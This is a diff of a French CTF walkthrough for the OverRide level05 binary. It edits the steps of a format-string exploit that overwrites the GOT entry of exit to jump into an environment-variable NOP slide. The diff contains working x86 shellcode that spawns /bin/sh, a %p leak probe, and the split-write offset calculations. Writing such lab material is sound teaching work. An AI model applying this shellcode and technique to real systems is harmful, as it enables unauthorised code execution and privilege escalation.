@@ -83,11 +83,8 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
    0x08048507 <+195>:	call   0x8048340 <printf@plt>
    0x0804850c <+200>:	movl   $0x0,(%esp)
    0x08048513 <+207>:	call   0x8048370 <exit@plt>
-
 ```
 </details>
-
-> _**REMARQUE:**_ Nous pouvons voir la fonction `gets` qui est utiliser par les childs du programme !
 
 ---
 ### ASEMBLY TO C
@@ -95,19 +92,18 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 *Clique [**ICI**](./Ressources/main.c) si tu veux voir tous le code en **C***
 
 ---
-### FORMAT STRING + GOT + NOPSLEED
+### FORMAT STRING + GOT + NOPSLIDE
 
 ##### export payload
 
-Nous preparons notre **NOPSLEED** dans l'env.
+Nous preparons notre **NOPSLIDE** dans l'env.
 
 ```bash
 level05@OverRide:~$ export payload=$(python -c 'print b"\x90"*1000 + b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
 ```
-AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
 ##### Trouver l'adresse de exit
 
-Nous avons besoins de l'adresse de exit dans le GOT pour pouvoir reecrire par dessus et le remplacer par un ret.
+Nous avons besoins de l'adresse de exit dans le GOT pour pouvoir reecrire par dessus et le remplacer par l'adresse de mon slide.
 
 ```bash
 level05@OverRide:~$ objdump -R ./level05 
@@ -126,7 +122,7 @@ OFFSET   TYPE              VALUE
 ```
 
 
-##### Prendre une adresse du sleed
+##### Prendre une adresse du sled
 
 ```bash
 x/200xs environ
@@ -170,16 +166,17 @@ Format	| Type écrit |	Taille  |	Valeur max               |	Valeur min          
 Nous allons devoir decouper l'adresse target en 2 `[0x080497e0]` et ecrire `[0xffffdb6d]`
 
 ###### target
-- LOW 080497e0
-- HIGH 080497e0 + 2 = 080497e2
+- **_LOW_** `0x080497e0`
+- **_HIGH_** `080497e0` + 2 = `080497e2`
 
-###### nopsled
-- ffff = 65535
-- dbf6 = 56173
+###### nopslide
+- **0xdbf6** = `56173`
+- **0xffff** = `65535`
+- **_LOW_** : `56173 - 8 = 56165`
+- **_HIGH_** :`65535 - 56173 = 9362`
 
-- LOW :  db6d = 56173 - 8 = 56165
-- HIGH : ffff = 65535 - 56173 = 9362
 > **_REMARQUES_**: En calculant high ne pas rajouter a la soustraction le `-8` du LOW !
+
 ---
 ### PAYLOAD
 
